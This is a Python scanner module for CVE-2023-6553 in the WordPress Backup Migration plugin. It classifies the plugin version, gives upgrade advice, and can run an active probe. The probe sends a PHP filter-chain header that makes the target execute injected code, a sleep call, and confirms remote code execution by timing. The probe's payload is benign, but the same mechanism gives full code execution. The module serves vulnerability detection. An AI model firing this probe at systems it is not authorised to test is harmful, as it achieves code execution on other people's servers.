from __future__ import annotations

import time
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.versions import parse_version_required, parse_version_safe
from .php_filter_chain import build_chain
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2023-6553"
NAME = "Backup Migration unauthenticated PHP filter-chain RCE"
RULE = "Backup Migration 1.0.8 through 1.3.7; fixed in 1.3.8"
PLUGIN_SLUG = "backup-backup"
TYPE = "Remote Code Execution"
CVSS = "9.8"


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return "DETECTED_VERSION_UNKNOWN"
    if value < parse_version_required("1.0.8"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if value <= parse_version_required("1.3.7") else "PATCHED"


def _timed_include(client: HttpClient, url: str, code: str, timeout: int) -> dict[str, Any]:
    chain = build_chain(code)
    started = time.monotonic()
    response = client.request(
        url,
        method="POST",
        headers={"Content-Dir": chain},
        data=b"",
        timeout=timeout,
        follow_redirects=False,
    )
    elapsed = time.monotonic() - started
    body = str(response.get("body") or "")
    return {
        "elapsed": round(elapsed, 2),
        "status": response.get("status"),
        "blocked": "Incorrect parameters" in body,
        "chain_length": len(chain),
    }


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
    base = normalize_url(target_url)
    url = f"{base}/wp-content/plugins/backup-backup/includes/backup-heart.php"
    probe_timeout = max(timeout, 12)
    client = HttpClient(timeout=probe_timeout, proxy=proxy)
    control = _timed_include(client, url, "<?php sleep(0);?>", probe_timeout)
    proof = _timed_include(client, url, "<?php sleep(4);?>", probe_timeout)
    confirmed = (
        not proof["blocked"]
        and proof["elapsed"] >= 3.5
        and control["elapsed"] <= 2.0
        and proof["elapsed"] - control["elapsed"] >= 2.5
    )
    return {
        "confirmed": confirmed,
        "blocked": proof["blocked"],
        "control": control,
        "proof": proof,
        "proof_url": url,
    }


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, kwargs
    finding = passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component="WordPress plugin Backup Migration",
        affected_rule=RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation=(
            "Upgrade Backup Migration to 1.3.8 or newer, which rejects filter-chain characters in the "
            "Content-Dir header, and review access logs for backup-heart.php requests."
        ),
        exploit_available=True,
    )
    if not run_exploit_check or finding.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return finding
    if exploit_mode != "safe":
        finding.detail += " This module supports only the safe filter-chain sleep differential."
        return finding

    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    finding.exploit_ran = True
    finding.evidence = {**(finding.evidence or {}), **proof}
    if proof["confirmed"]:
        finding.status = "VULNERABLE"
        finding.confidence = "CONFIRMED"
        finding.proof_url = proof["proof_url"]
        finding.detail = (
            "The Content-Dir header carried a php://filter chain that prepends PHP to the required "
            "bypasser.php stream. A chain ending in sleep(0) returned in "
            f"{proof['control']['elapsed']}s while the sleep(4) chain returned in "
            f"{proof['proof']['elapsed']}s, proving the require executed attacker-supplied PHP. "
            f"No command or file write was performed. (CVSS {CVSS})"
        )
    elif proof["blocked"]:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "HIGH"
        finding.detail = (
            "The endpoint returned 'Incorrect parameters', the 1.3.8 filterChainFix response; the "
            "filter-chain include was rejected."
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The filter-chain sleep differential was not observed "
            f"(control={proof['control']['elapsed']}s, proof={proof['proof']['elapsed']}s)."
        )
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": "WordPress plugin Backup Migration",
        "affected_rule": RULE,
        "affected_versions": ["1.0.8-1.3.7"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-13",
        "updated": "2026-11-13",
        "required_detectors": ["wordpress"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2023-6553",
            "https://www.wordfence.com/blog/2023/12/critical-unauthenticated-remote-code-execution-found-in-backup-migration-plugin/",
            "https://github.com/synacktiv/php_filter_chain_generator",
        ],
    }
